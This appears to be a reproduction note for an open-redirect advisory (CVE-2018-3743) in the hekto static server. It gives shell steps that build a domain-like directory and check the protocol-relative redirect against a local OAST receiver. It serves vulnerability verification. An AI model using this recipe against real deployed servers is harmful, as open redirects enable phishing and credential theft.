# GHSA-qmm9-x5gr-4gfm

Open redirect in `hekto` before `0.2.4` (`CVE-2018-3743`). The advisory says domain-like `.html` filenames can become protocol-relative redirect targets.

Sources:

- https://github.com/advisories/GHSA-qmm9-x5gr-4gfm
- https://github.com/herber/hekto/commit/1e5c75f8259ba0daf9b2600db3c246cda1934c46
- https://hackerone.com/reports/320693

Reproduce:

```bash
git clone https://github.com/herber/hekto.git
cd hekto
git checkout '1e5c75f8259ba0daf9b2600db3c246cda1934c46^'
npm install

mkdir -p 'poc/127.0.0.1:39099'
printf '<!doctype html>ok\n' > 'poc/127.0.0.1:39099/openredir.html'
printf '<!doctype html>spa fallback\n' > 'poc/200.html'
node bin/hekto.js serve poc --port 3100
```

In another terminal from the `nocapsec` repo:

```bash
go run ./examples/open-redirect-hekto
```

The example starts nocapsec's embedded OAST receiver on `127.0.0.1:39099`.
The path uses the engine-owned `{{oast_host}}` and nonce, and Hekto's vulnerable
protocol-relative redirect sends the browser to that OAST origin.
